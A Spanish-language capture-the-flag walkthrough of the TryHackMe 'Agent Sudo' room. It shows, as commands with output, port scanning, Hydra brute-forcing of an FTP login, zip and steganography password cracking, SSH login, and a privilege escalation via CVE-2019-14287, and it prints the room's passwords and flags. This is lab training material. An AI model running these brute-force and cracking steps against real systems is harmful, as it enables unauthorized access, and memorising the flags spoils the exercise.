# Agent Sudo - TryHackMe

- Objetivo: Obtener acceso al sistema y escalar privilegios hasta root.
- Fecha: 12/06/2025
- Autor del reto: Liiaam251
- Enlace a la máquina: [https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf)
- IP de la máquina: 10.10.220.41

## Enumeración de puertos con Nmap
Comando utilizado:
````
$ nmap -p- --open -sS -sV -sC -T4 -n -Pn 10.10.220.41
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 12:03 EDT
Nmap scan report for 10.10.220.41
Host is up (0.060s latency).
Not shown: 63608 closed tcp ports (reset), 1924 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.33 seconds
````
Entrando al http:// encontramos esto:  
````
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
````
Nos hace referencia que cambiando el user agent por otro numero a lo mejor damos con una página de otro:
Vamos a usar curl para esta acción probando las diferentes letras:
````
$ curl -A "C" -L http://10.10.156.39/
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
````
Y ya tenemos un user con el que vamos a lanzar un hydra:
````
─$ hydra -l chris -P /home/kali/Downloads/rockyou.txt 10.10.156.39 ftp      
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-16 12:42:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.156.39:21/
[21][ftp] host: 10.10.156.39   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-16 12:43:31
````
Y ya tenemos password para el ftp:
Usamos binwalk para ver si hay zips ya que las tascas se insunua y  vemos: 
````

$ binwalk cutie.png      

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
````
Para extraer: 
````
$ binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
````
````
─$ zip2john 8702.zip > hash.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/AgentSudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  hash.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/AgentSudo/_cutie.png.extracted]
└─$ john --wordlist=rockyou.txt hash.txt              

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
fopen: rockyou.txt: No such file or directory
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/AgentSudo/_cutie.png.extracted]
└─$ john --wordlist=/home/kali/Downloads/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2025-06-16 13:01) 1.162g/s 28576p/s 28576c/s 28576C/s merlina..280690
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
````
````
Vamoss a descomprimir este zip con la contraseña alien y nos da un txt:
$ cat To_agentR.txt      
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
````
Con esto y pasandolo por cybershef que nos da Area51
Al tener un passworb vamos a intentar usar   steghide:
````
$ steghide extract -sf  cute-alien.jpg -p Area51
wrote extracted data to "message.txt".
````
````
$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
````
tenemos usuario y password:
````
ssh james@10.10.156.39
The authenticity of host '10.10.156.39 (10.10.156.39)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.156.39' (ED25519) to the list of known hosts.
james@10.10.156.39's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun 16 17:30:32 UTC 2025

  System load:  0.0               Processes:           101
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 37%               IP address for ens5: 10.10.156.39
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ whoami
james
````
## Escalada Privilegios 

Hacemos un sudo -l y podemos ejecutar /bash como sudo 

Vamos a buscar un CVE que podamos usar para escalar privilegios:

he usado: 
````
 CVE-2019-14287 
````
Después me lo paso con python y ya seriamos root ejecutandolo, la flag de root está dentro de /root y la del user dentro del usuario:

````
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
````
y la de root:
````
b53a02f55b57d4439e3341834d70c062
````






